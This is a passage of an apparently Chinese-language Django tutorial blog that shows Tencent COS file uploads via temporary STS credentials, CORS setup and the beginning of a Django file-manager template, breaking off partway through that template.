class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>跨域问题（游览器导致）</p><p>在cos服务端设置特殊的响应头：<code>allow.origin：*</code></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/cos%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE.jpg"  alt="cos跨域访问"></p></li></ul><h4 id="4-cos上传文件：临时秘钥【推荐】（该项目使用的方法）"><a href="#4-cos上传文件：临时秘钥【推荐】（该项目使用的方法）" class="headerlink" title="4.cos上传文件：临时秘钥【推荐】（该项目使用的方法）"></a>4.cos上传文件：临时秘钥【推荐】（该项目使用的方法）</h4><ul><li><p>构造临时秘钥的 url 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 文件管理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 临时秘钥</span></span><br><span class="line">    url(<span class="string">r'^cos/credential/$'</span>, file.cos_credential, name=<span class="string">'cos_credential'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p>临时秘钥的视图函数<strong>（以下为知识点，不在项目范围）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cos_credential</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 生成一个临时凭证，并返回前端</span></span><br><span class="line">    <span class="comment"># 1. 安装一个临时凭证python模块</span></span><br><span class="line">    <span class="comment"># pip install -U qcloud-python-sts</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2.写代码</span></span><br><span class="line">    <span class="keyword">from</span> sts.sts <span class="keyword">import</span> Sts</span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="comment"># 临时秘钥有效时长，单位是秒（30分钟=1800秒）</span></span><br><span class="line">        <span class="string">'duration_seconds'</span>:<span class="number">1800</span>,</span><br><span class="line">        <span class="comment"># 固定秘钥 id</span></span><br><span class="line">        <span class="string">'secret_id'</span>: <span class="string">"自己的cos的id"</span>,</span><br><span class="line">        <span class="comment"># 固定秘钥 key</span></span><br><span class="line">        <span class="string">'secret_key'</span>: <span class="string">"自己的cos的key"</span>,</span><br><span class="line">        <span class="comment"># 换成你的 bucket</span></span><br><span class="line">        <span class="string">'bucket'</span>:<span class="string">'xxxxx'</span>,</span><br><span class="line">        <span class="comment"># 换成 bucket 所在的地区</span></span><br><span class="line">        <span class="string">'region'</span>: <span class="string">'ap-nanjing'</span>,</span><br><span class="line">        <span class="comment"># 允许的路径前缀，可以根据自己的网站用户登录状态判断允许上传的具体路径</span></span><br><span class="line">        <span class="comment"># 例子：a.jpg 或者 a/* 或者 * (使用通配符*存在重大的安全风险)</span></span><br><span class="line">        <span class="string">'allow_prefix'</span>:<span class="string">'*'</span>,</span><br><span class="line">        <span class="comment"># 秘钥的权限列表。简单的上传和分片需一下的权限，其他权限查看https://cloud.tencent.com/document/product/436/31923</span></span><br><span class="line">        <span class="string">'allow_actions'</span>:[</span><br><span class="line">            <span class="comment"># 简单上传操作 </span></span><br><span class="line">            <span class="string">"name/cos:PutObject"</span>,</span><br><span class="line">            <span class="comment"># 表单上传对象 </span></span><br><span class="line">            <span class="comment"># "name/cos:PostObject",</span></span><br><span class="line">            <span class="comment"># 分块上传：初始化分块操作 </span></span><br><span class="line">            <span class="comment"># "name/cos:InitiateMultipartUpload",</span></span><br><span class="line">            <span class="comment"># 分块上传：List 进行中的分块上传</span></span><br><span class="line">            <span class="comment"># "name/cos:ListMultipartUploads",</span></span><br><span class="line">            <span class="comment"># 分块上传：List 已上传分块操作 </span></span><br><span class="line">            <span class="comment"># "name/cos:ListParts",</span></span><br><span class="line">            <span class="comment"># 分块上传：上传分块块操作 </span></span><br><span class="line">            <span class="comment"># "name/cos:UploadPart",</span></span><br><span class="line">            <span class="comment"># 分块上传：完成所有分块上传操作 </span></span><br><span class="line">            <span class="comment"># "name/cos:CompleteMultipartUpload",</span></span><br><span class="line">            <span class="comment"># 取消分块上传操作 </span></span><br><span class="line">            <span class="comment"># "name/cos:AbortMultipartUpload"</span></span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sts = Sts(config)</span><br><span class="line">    result_dict = sts.get_credential()</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(result_dict)</span><br></pre></td></tr></table></figure></li><li><p>前端代码<strong>（以下为知识点，不在项目范围）</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>示例：直接通过秘钥进行上传文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span> <span class="attr">id</span>=<span class="string">"uploadFile"</span> <span class="attr">multiple</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-3.4.1.min.js' %&#125;"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/cos-js-sdk-v5.min.js' %&#125;"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> cos;</span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            initCOS();</span><br><span class="line">            bindChangeFileInput();</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">initCOS</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">            cos = <span class="keyword">new</span> COS(&#123;</span></span><br><span class="line"><span class="actionscript">                getAuthorization:<span class="function"><span class="keyword">function</span><span class="params">(options,callback)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 想django后台发送请求，获取临时凭证</span></span></span><br><span class="line"><span class="javascript">                    $.<span class="keyword">get</span>('/cos/credential/',&#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 可从 options 取需要的参数</span></span></span><br><span class="line"><span class="actionscript">                    &#125;,<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> credentials = data &amp;&amp; data.credentials;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span>(!data || !credentials) <span class="keyword">return</span> <span class="built_in">console</span>.error(<span class="string">'credentials invalid'</span>);</span></span><br><span class="line">                        callback(&#123;</span><br><span class="line">                            TmpSecretId:credentials.tmpSecretId,</span><br><span class="line">                            TmpSecretKey:credentials.tmpSecretKey,</span><br><span class="line">                            XCosSecurityToken:credentials.sessionToken,</span><br><span class="line">                            StartTime:data.startTime,</span><br><span class="line">                            ExpiredTime:data.expiredTime,</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">bindChangeFileInput</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#uploadFile'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 获取要上传的所有文件对象列表</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// $(this)[0] = document.getElementById('uploadFile')</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> files = $(<span class="keyword">this</span>)[<span class="number">0</span>].files;</span></span><br><span class="line"><span class="javascript">                $.each(files,<span class="function"><span class="keyword">function</span>(<span class="params">index,fileObject</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">//上传文件</span></span></span><br><span class="line">                    cos.putObject(&#123;</span><br><span class="line"><span class="actionscript">                        Bucket:<span class="string">'xxxxxxx'</span>,<span class="comment">/*必须*/</span></span></span><br><span class="line"><span class="actionscript">                        Region:<span class="string">'ap-nanjing'</span>, <span class="comment">/* 必须 */</span></span></span><br><span class="line">                        Key:fileName,</span><br><span class="line"><span class="actionscript">                        Body:fileObject,<span class="comment">//上传文件对象</span></span></span><br><span class="line"><span class="actionscript">                        onProgress:<span class="function"><span class="keyword">function</span><span class="params">(progressData)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="comment">//进度条</span></span></span><br><span class="line"><span class="javascript">                            <span class="built_in">console</span>.log(<span class="string">"文件上传精度--&gt;"</span>,fileName,<span class="built_in">JSON</span>.stringify(progressData));</span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="actionscript">                    &#125;,<span class="function"><span class="keyword">function</span><span class="params">(err,data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 是否上传成功</span></span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 把上传成功的文件信息提交给django，djangi写入数据库</span></span></span><br><span class="line"><span class="javascript">         <span class="built_in">console</span>.log(err || data);</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>跨域问题，与上面方法相同</p></li></ul><h3 id="11-4-创建文件夹-amp-编辑文件夹"><a href="#11-4-创建文件夹-amp-编辑文件夹" class="headerlink" title="11.4 创建文件夹 &amp; 编辑文件夹"></a>11.4 创建文件夹 &amp; 编辑文件夹</h3><h4 id="11-4-1file-html模板"><a href="#11-4-1file-html模板" class="headerlink" title="11.4.1file.html模板"></a>11.4.1<code>file.html</code>模板</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> <span class="selector-class">.panel-heading</span> &#123;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: row;</span><br><span class="line">        &#123;# 以行为单位 #&#125; justify-content: space-between;</span><br><span class="line">        &#123;# 该标签下的div左右排列 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &gt; <span class="selector-class">.panel-heading</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &gt; <span class="selector-class">.panel-heading</span> <span class="selector-tag">span</span> &#123;</span></span><br><span class="line">            padding: 0 5px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &gt; <span class="selector-class">.panel-heading</span> <span class="selector-class">.function</span> <span class="selector-class">.upload</span> &#123;</span></span><br><span class="line">            overflow: hidden;</span><br><span class="line">        &#123;# 超出大小隐藏 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &gt; <span class="selector-class">.panel-heading</span> <span class="selector-class">.function</span> <span class="selector-tag">input</span> &#123;</span></span><br><span class="line">            opacity: 0;</span><br><span class="line">        &#123;# 透明度为0，隐藏 #&#125; position: absolute;</span><br><span class="line">        &#123;# 绝对定位 #&#125; top: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">            width: 76px;</span><br><span class="line">            left: -2px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.upload-progress</span> &#123;</span></span><br><span class="line">            position: fixed;</span><br><span class="line">            right: 2px;</span><br><span class="line">            bottom: 2px;</span><br><span class="line">            width: 400px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.upload-progress</span> <span class="selector-class">.progress-error</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span> <span class="attr">style</span>=<span class="string">"margin-top: 20px"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'file' project_id=request.tracer.project.id %&#125;"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-home"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 文件库</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% for record in breadcrumb_list %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'file' project_id=request.tracer.project.id %&#125;?folder=&#123;&#123; record.id &#125;&#125;"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-caret-right"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> &#123;&#123; record.name &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"function"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-xs upload"</span> <span class="attr">style</span>=<span class="string">"position: relative"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-upload"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 上传文件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span> <span class="attr">name</span>=<span class="string">"uploadFile"</span> <span class="attr">id</span>=<span class="string">"uploadFile"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-success btn-xs"</span> <span class="attr">data-toggle</span>=<span class="string">"modal"</span> <span class="attr">data-target</span>=<span class="string">"#addModal"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">data-whatever</span>=<span class="string">"新建文件夹"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 新建文件夹</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>文件大小<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>更新者<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>更新时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">id</span>=<span class="string">"rowList"</span>&gt;</span></span><br><span class="line">                &#123;% for item in file_object_list %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                            &#123;% if item.file_type == 2 %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'file' project_id=request.tracer.project.id %&#125;?folder=&#123;&#123; item.id &#125;&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-folder"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; item.name &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &#123;% else %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-file"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                &#123;&#123; item.name &#125;&#125;</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                            &#123;% if item.file_type == 1 %&#125;</span><br><span class="line">                                &#123;&#123; item.file_size &#125;&#125;</span><br><span class="line">                            &#123;% else %&#125;</span><br><span class="line">                                -</span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; item.update_user.username &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; item.update_datetime &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span 